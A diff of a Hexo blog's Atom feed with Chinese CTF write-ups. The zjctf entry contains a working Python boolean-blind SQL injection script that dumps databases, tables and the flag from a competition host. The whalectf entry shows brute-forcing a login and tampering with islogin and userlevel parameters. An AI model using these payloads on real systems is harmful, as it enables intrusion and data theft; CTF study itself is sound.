@@ -1,29 +1,73 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>super/guo</title>
+  <title>super guo</title>
   
   
   <link href="/atom.xml" rel="self"/>
   
-  <link href="http://www.mr-guo.xin/"/>
-  <updated>2018-10-09T02:51:30.486Z</updated>
-  <id>http://www.mr-guo.xin/</id>
+  <link href="http://www.magic09.com/"/>
+  <updated>2018-11-10T05:46:28.184Z</updated>
+  <id>http://www.magic09.com/</id>
   
   <author>
-    <name>super/guo</name>
+    <name>super guo</name>
     
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>whalectf</title>
-    <link href="http://www.mr-guo.xin/2018/10/09/whalectf/"/>
-    <id>http://www.mr-guo.xin/2018/10/09/whalectf/</id>
-    <published>2018-10-09T00:29:01.000Z</published>
-    <updated>2018-10-09T02:51:30.486Z</updated>
+    <title>docker</title>
+    <link href="http://www.magic09.com/2018/11/10/docker/"/>
+    <id>http://www.magic09.com/2018/11/10/docker/</id>
+    <published>2018-11-10T04:59:50.000Z</published>
+    <updated>2018-11-10T05:46:28.184Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="基本训练场web"><a href="#基本训练场web" class="headerlink" title="基本训练场web"></a>基本训练场web</h2><h3 id="密码泄露"><a href="#密码泄露" class="headerlink" title="密码泄露"></a>密码泄露</h3><a id="more"></a><pre><code>进入页面出现登录界面，观察一下发现title是个文件，访问出现密码列表</code></pre><p><img src="/2018/10/09/whalectf/mmxl01.png" alt=""></p><pre><code>用burp爆破得到密码</code></pre><p><img src="/2018/10/09/whalectf/mmxl02.png" alt=""></p><pre><code>登录时提示失败，检查页面源码发现输入框限制字符长度为5，修改后成功提示：这里没有flag于是跑去检查响应包，发现响应头有个newpage参数，值是固定的，用base64解开得到一个文件名</code></pre><p><img src="/2018/10/09/whalectf/mmxl03.png" alt=""></p><pre><code>访问后是一个留言界面</code></pre><p><img src="/2018/10/09/whalectf/mmxl04.png" alt=""></p><pre><code>尝试留言提示未登录，并且页面没有登录入口，于是抓包查看</code></pre><p><img src="/2018/10/09/whalectf/mmxl05.png" alt=""></p><pre><code>islogin根据字面意思是用来判断登录状态，尝试修改为1后提交请求，发现留言成功，提示消息变为：你没有权限访问</code></pre><p><img src="/2018/10/09/whalectf/mmxl06.png" alt=""></p><pre><code>继续检查请求包，发现有个userlevel参数，可能是用来判断用户权限的字段，尝试修改为admin，xiaohei。仔细想了想，可能是数据库的默认账户root，提交后发现成功！在响应包的setcookie字段得到flag。</code></pre>]]></content>
+    <content type="html"><![CDATA[<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><pre><code>安装环境：ubuntu 16.04.1 lts安装方法：apt安装1. 更新软件源中的所有软件列表    apt-get update2. 安装可选内核模块包    apt-get install \    linux-image-extra-$(uname -r) \    linux-image-extra-virtual3. 需要添加使用 HTTPS 传输的软件包以及 CA 证书    apt-get install \    apt-transport-https \    ca-certificates \    curl \    software-properties-common4. 添加软件源的    GPG    密钥    curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg|apt-key add -5. 向 source.list 中添加 Docker 软件源    add-apt-repository \    &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \    $(lsb_release    -cs) \    stable&quot;6. 更新 apt 软件包缓存，并安装 docker-ce    apt-get update    apt-get install docker-ce</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;docker&quot;&gt;&lt;a href=&quot;#docker&quot; class=&quot;headerlink&quot; title=&quot;docker&quot;&gt;&lt;/a&gt;docker&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;安装环境：ubuntu 16.04.1 lts
+安装方法：apt安装
+
+1. 更新软件源中的
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>zjctf</title>
+    <link href="http://www.magic09.com/2018/11/06/zjctf/"/>
+    <id>http://www.magic09.com/2018/11/06/zjctf/</id>
+    <published>2018-11-06T02:10:18.000Z</published>
+    <updated>2018-11-10T05:47:36.866Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="浙江省首届大学生网络与信息安全竞赛-专科组"><a href="#浙江省首届大学生网络与信息安全竞赛-专科组" class="headerlink" title="浙江省首届大学生网络与信息安全竞赛(专科组)"></a>浙江省首届大学生网络与信息安全竞赛(专科组)</h1><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><a id="more"></a><pre><code>1. 整个比赛时长8小时(8:30-16:30)，包括休息时间，午餐也是在赛场解决，比赛过程中情况都还良好2. 因为是浙江省第一届的ctf类竞赛，所以这次比赛的题目还是有些水分的，以及题目的类型顺序都是杂乱的，有些不适3. 从赛后的解题结果来看，杂项的占据了大部分，逆向和pwn以及web体型做出的队伍比较少4. 遗憾的是这次我们的队伍值解出两题(杂项+web)，但是据说web题只有两队解出来(本科一队，还有我们是一队)5. 丢分的两道题：第一关卡第一题，没有什么技术含量，需要靠脑洞解题；附加题一题是颜文字解密，由于我们的准备不充足没有提前准备好工具很可惜6. 杂项的有一题是玩游戏的，是预赛题目的升级版总结：在杂项上准备不充分，脑洞题目上思路不够开阔</code></pre><h2 id="writerup"><a href="#writerup" class="headerlink" title="writerup"></a>writerup</h2><!-- ### 小猪佩奇write up把图放到winhex里观察，搜索压缩包头504b发现存在压缩文件把图放到kail里binwalk+foremost从压缩包中提取到一个mp3文件，以及psw等若干文件， 在在\psw\word\media路径下，发现存在一张二维码回过头，结合mp3及根据开放的工具，考虑音频隐写，选择使用mp3stego，之前二维码中得到的密码即为mp3stego中解密所需的密码，解密之后得到隐藏的txt如下Base64解密得到答案 --><h3 id="盲人摸象"><a href="#盲人摸象" class="headerlink" title="盲人摸象"></a>盲人摸象</h3><ol><li><p>提示是注入，测试发现是布尔盲注，这时出现了提示信息了解到关键是需要查询的数据不在当前的数据库中，测试发现=、&gt;等字符被过滤。</p></li><li><p>id=1和id=1-1返回相同结果猜测是字符型；<br>构造id=0”or 1 和 id=0”or 0 页面会返回不同的结果 ；<br>想到采用 case when … then … else … end 构造条件语句替代后面的1和0 ；<br>测试语句0”or case when(1) then 1 else 0 end– - 返回You find it！</p></li></ol><p>测试语句0’or case when(0) then 1 else 0 end– - 返回Hide more deep.</p><p>这样就有了布尔盲注的基础条件了，接下来就是构造条件。</p><ol><li>编写python脚本</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">'http://172.21.1.102:61234/iFmn2H0UOq/'</span></span><br><span class="line">s=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(1,200):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890~`!@\#$%^&amp;*()_+-=&#123;&#125;[]|\\:;\"\'/.,"</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 首先查询出当前使用的数据库</span></span><br><span class="line">        <span class="comment"># data = &#123;'id': '0" or case when (ord(substr((select database()),'+ str(x) +',1)in(\"' + i + '\")))  then 1 else 0 end-- -','Submit': 'Search'&#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 根据提示查询出所有的数据库，发现除了系统自带的和当前使用的tips还有一个叫useless的数据库</span></span><br><span class="line">        <span class="comment"># data = &#123;'id': '0" or case when (ord(substr((select group_concat(schema_name) from information_schema.schemata),' + str(x) + ',1))in(ord(\"' + i + '\")))  then 1 else 0 end-- -','Submit': 'Search'&#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 然后查询useless库中所有的表，表有很多，最后跑出来最后一个表的名字是zjctf，明显是存放flag的表</span></span><br><span class="line">        <span class="comment"># data = &#123;'id': '0" or case when (ord(substr((select group_concat(table_name) from information_schema.tables where table_schema in("useless")),' + str(x) + ',1)in(\"' + i + '\")))  then 1 else 0 end-- -','Submit': 'Search'&#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 然后查询表字段只有title和content</span></span><br><span class="line">        <span class="comment"># data = &#123;'id': '0" or case when (ord(substr((select group_concat(column_name) from information_schema.columns where table_name in("zjctf")),' + str(x) + ',1)in(\"' + i + '\")))  then 1 else 0 end-- -','Submit': 'Search'&#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 最后就是查询出表中的数据，中间出了点问题，之前的脚本跑出了flag但是没有用ascii做对比(ord()),前面的因为都是小写所以没有问题，但是flag提交是错误的，添加了ord后跑出了正确的flag</span></span><br><span class="line">        data = &#123;<span class="string">'id'</span>: <span class="string">'0" or case when (ord(substr((select group_concat(title,content) from useless.zjctf),'</span> + str(x) + <span class="string">',1))in(ord(\"'</span> + i + <span class="string">'\")))  then 1 else 0 end-- -'</span>,<span class="string">'Submit'</span>: <span class="string">'Search'</span>&#125;</span><br><span class="line">        <span class="comment"># data = &#123;'id': '0" or case when (substr((select group_concat(content) from tip),' + str(x) + ',1)in(\"' + i + '\"))  then 1 else 0 end-- -','Submit': 'Search'&#125;</span></span><br><span class="line">        <span class="comment"># print data</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"find"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            s = s + i</span><br><span class="line">            <span class="built_in">print</span> s</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;浙江省首届大学生网络与信息安全竞赛-专科组&quot;&gt;&lt;a href=&quot;#浙江省首届大学生网络与信息安全竞赛-专科组&quot; class=&quot;headerlink&quot; title=&quot;浙江省首届大学生网络与信息安全竞赛(专科组)&quot;&gt;&lt;/a&gt;浙江省首届大学生网络与信息安全竞赛(专科组)&lt;/h1&gt;&lt;h2 id=&quot;感受&quot;&gt;&lt;a href=&quot;#感受&quot; class=&quot;headerlink&quot; title=&quot;感受&quot;&gt;&lt;/a&gt;感受&lt;/h2&gt;
+    
+    </summary>
+    
+    
+      <category term="ctf" scheme="http://www.magic09.com/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>whalectf</title>
+    <link href="http://www.magic09.com/2018/10/09/whalectf/"/>
+    <id>http://www.magic09.com/2018/10/09/whalectf/</id>
+    <published>2018-10-09T00:29:01.000Z</published>
+    <updated>2018-10-16T11:14:05.163Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="基本训练场web"><a href="#基本训练场web" class="headerlink" title="基本训练场web"></a>基本训练场web</h2><h3 id="密码泄露"><a href="#密码泄露" class="headerlink" title="密码泄露"></a>密码泄露</h3><a id="more"></a><pre><code>进入页面出现登录界面，观察一下发现title是个文件，访问出现密码列表</code></pre><p><img src="/2018/10/09/whalectf/mmxl01.png" alt=""></p><pre><code>用burp爆破得到密码</code></pre><p><img src="/2018/10/09/whalectf/mmxl02.png" alt=""></p><pre><code>登录时提示失败，检查页面源码发现输入框限制字符长度为5，修改后成功提示：这里没有flag于是跑去检查响应包，发现响应头有个newpage参数，值是固定的，用base64解开得到一个文件名</code></pre><p><img src="/2018/10/09/whalectf/mmxl03.png" alt=""></p><pre><code>访问后是一个留言界面</code></pre><p><img src="/2018/10/09/whalectf/mmxl04.png" alt=""></p><pre><code>尝试留言提示未登录，并且页面没有登录入口，于是抓包查看</code></pre><p><img src="/2018/10/09/whalectf/mmxl05.png" alt=""></p><pre><code>islogin根据字面意思是用来判断登录状态，尝试修改为1后提交请求，发现留言成功，提示消息变为：你没有权限访问</code></pre><p><img src="/2018/10/09/whalectf/mmxl06.png" alt=""></p><pre><code>继续检查请求包，发现有个userlevel参数，可能是用来判断用户权限的字段，尝试修改为admin，xiaohei。仔细想了想，可能是数据库的默认账户root，提交后发现成功！在响应包的setcookie字段得到flag。</code></pre><h2 id="打卡训练场web【第一期】"><a href="#打卡训练场web【第一期】" class="headerlink" title="打卡训练场web【第一期】"></a>打卡训练场web【第一期】</h2><h3 id="真的注入"><a href="#真的注入" class="headerlink" title="真的注入"></a>真的注入</h3>]]></content>
     
     <summary type="html">
     
@@ -31,17 +75,17 @@
     
     </summary>
     
-      <category term="Web-Security" scheme="http://www.mr-guo.xin/categories/Web-Security/"/>
+      <category term="Web-Security" scheme="http://www.magic09.com/categories/Web-Security/"/>
     
     
-      <category term="ctf" scheme="http://www.mr-guo.xin/tags/ctf/"/>
+      <category term="ctf" scheme="http://www.magic09.com/tags/ctf/"/>
     
   </entry>
   
   <entry>
     <title>BUGKU</title>
-    <link href="http://www.mr-guo.xin/2018/09/29/BUGKU/"/>
-    <id>http://www.mr-guo.xin/2018/09/29/BUGKU/</id>
+    <link href="http://www.magic09.com/2018/09/29/BUGKU/"/>
+    <id>http://www.magic09.com/2018/09/29/BUGKU/</id>
     <published>2018-09-29T00:11:31.000Z</published>
     <updated>2018-10-06T07:03:39.881Z</updated>
     
@@ -53,17 +97,17 @@
     
     </summary>
     
-      <category term="Web-Security" scheme="http://www.mr-guo.xin/categories/Web-Security/"/>
+      <category term="Web-Security" scheme="http://www.magic09.com/categories/Web-Security/"/>
     
     
-      <category term="ctf" scheme="http://www.mr-guo.xin/tags/ctf/"/>
+      <category term="ctf" scheme="http://www.magic09.com/tags/ctf/"/>
     
   </entry>
   
   <entry>
     <title>NYCtf</title>
-    <link href="http://www.mr-guo.xin/2018/09/26/NYCtf/"/>
-    <id>http://www.mr-guo.xin/2018/09/26/NYCtf/</id>
+    <link href="http://www.magic09.com/2018/09/26/NYCtf/"/>
+    <id>http://www.magic09.com/2018/09/26/NYCtf/</id>
     <published>2018-09-26T02:29:37.000Z</published>
     <updated>2018-10-08T00:26:39.653Z</updated>
     
@@ -75,17 +119,17 @@
     
     </summary>
     
-      <category term="Web-Security" scheme="http://www.mr-guo.xin/categories/Web-Security/"/>
+      <category term="Web-Security" scheme="http://www.magic09.com/categories/Web-Security/"/>
     
     
-      <category term="ctf" scheme="http://www.mr-guo.xin/tags/ctf/"/>
+      <category term="ctf" scheme="http://www.magic09.com/tags/ctf/"/>
     
   </entry>
   
   <entry>
     <title>sqli-labs解题思路</title>
-    <link href="http://www.mr-guo.xin/2018/07/06/sql-labs/"/>
-    <id>http://www.mr-guo.xin/2018/07/06/sql-labs/</id>
+    <link href="http://www.magic09.com/2018/07/06/sql-labs/"/>
+    <id>http://www.magic09.com/2018/07/06/sql-labs/</id>
     <published>2018-07-06T01:11:36.735Z</published>
     <updated>2018-10-09T01:18:07.466Z</updated>
     
@@ -100,19 +144,19 @@
     
     </summary>
     
-      <category term="Web-Security" scheme="http://www.mr-guo.xin/categories/Web-Security/"/>
+      <category term="Web-Security" scheme="http://www.magic09.com/categories/Web-Security/"/>
     
-      <category term="sqli-labs" scheme="http://www.mr-guo.xin/categories/Web-Security/sqli-labs/"/>
+      <category term="sqli-labs" scheme="http://www.magic09.com/categories/Web-Security/sqli-labs/"/>
     
     
-      <category term="mysql" scheme="http://www.mr-guo.xin/tags/mysql/"/>
+      <category term="mysql" scheme="http://www.magic09.com/tags/mysql/"/>
     
   </entry>
   
   <entry>
     <title>Hello World</title>
-    <link href="http://www.mr-guo.xin/2018/03/15/hello-world/"/>
-    <id>http://www.mr-guo.xin/2018/03/15/hello-world/</id>
+    <link href="http://www.magic09.com/2018/03/15/hello-world/"/>
+    <id>http://www.magic09.com/2018/03/15/hello-world/</id>
     <published>2018-03-15T12:24:23.014Z</published>
     <updated>2018-07-06T02:23:45.100Z</updated>
     
